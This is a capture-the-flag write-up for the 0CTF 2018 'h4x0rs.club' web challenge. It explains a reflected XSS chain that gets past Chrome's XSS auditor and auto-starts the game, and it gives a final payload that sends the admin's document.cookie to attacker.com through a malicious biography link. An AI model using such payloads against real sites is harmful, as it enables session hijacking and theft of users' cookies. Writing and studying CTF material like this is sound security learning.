# 0CTF 2018: h4x0rs.club  - Part II

**Category:** Web
**Points:** 687
**Solves:** 6
**Description:**

> Get document.cookie of the admin: https://h4x0rs.club/game/

**Note:** This is an unintendend solution for the challenge.
## Write-up
 
### Finding the XSS

There is a XSS on `/game/javascripts/app.js` in the function responsible for checking if the player won or lost the game.

```
function b() {
       x(), $(".js-user").append($("#audiences").html()), $(".challenge-out-of-time").show();
       [...]
 }
```

The function above copies the html of an element with id `audiences` to an element with class `js-user` so by creating these elements using the injection on `/game/?msg=` we can achieve javascript execution.

Then, theoretically, by accessing `https://h4x0rs.club/game/?msg=<div id="audiences"><script>alert(1);</div></div></div><div class="js-user"></div>` and clicking on the play button an alert should pop up after around 15 seconds (the time it takes for the game to end).

But it doesn't, we are stopped by Chrome's XSS auditor which blocks the access to the page because it detected that a `script` tag on the URL was also reflected into the page.

We can bypass it by sending `https://h4x0rs.club/game/?msg=<div id="audiences"><script><!--alert(1);</div></div></div><div class="js-user"></div>` which isn't executed by the browser, but when appended by JQuery through the `append` function, will, surprisingly, ignore the `<!--`
and add our tag to the `js-user` div.

### Triggering the XSS

Finding the XSS isn't all that is needed to solve this challenge, given the user would have to click in the play button for the XSS to be triggered, and in this case, the admin will not interact in any way with the page after accessing it.

This is when the code on `/game/javascripts/client.js` comes in handy.

```
$( document ).ready(function() {
    CLIENT_GAME.init();
    [...]
    setTimeout(function(){$('.js-difficulty').children().click();}, 1000);
});
```

The code above will get all childrens of the elements with class `js-difficulty` and then click on them, exactly what we need to finish the chain.
By creating a div with class `js-difficulty` and inside it creating another div with class `js-start-button` we can start the game without any user interaction.

You can test it by accessing:

```https://h4x0rs.club/game/?msg=<div class="js-difficulty"><div class="js-start-button"></div></div>```

Combining these two we arrive at the final payload that will be sent to the admin:

```https://h4x0rs.club/game/?msg=<div id="audiences"><script><!--location.href="http://attacker.com/?cookie="+document.cookie;</script></div><div class="js-user"></div><div class="js-difficulty"><div class="js-start-button"></div></div>```

### Sending the payload

The biography also isn't being properly sanitized, so you can set it to:

```<a href="http://attacker.com/redirect.html" id="report-btn"></a>```

Further, reporting your own profile to the admin with the hash `report` added to it will make the admin click on the link and be redirected to your website, because the code below is present in the page:

```
if(location.hash.slice(1) == 'report'){
       document.getElementById('report-btn').click();
}
```

Then you make `redirect.html` redirect the admin again to your final payload, which will start the game and trigger the XSS, sending his session (and the flag) back to you.

## Flag

```flag{postman_1n_the_middl3}```

## Contact

If you have any questions feel free to contanct me on [@lbherrera_](https://twitter.com/lbherrera_)
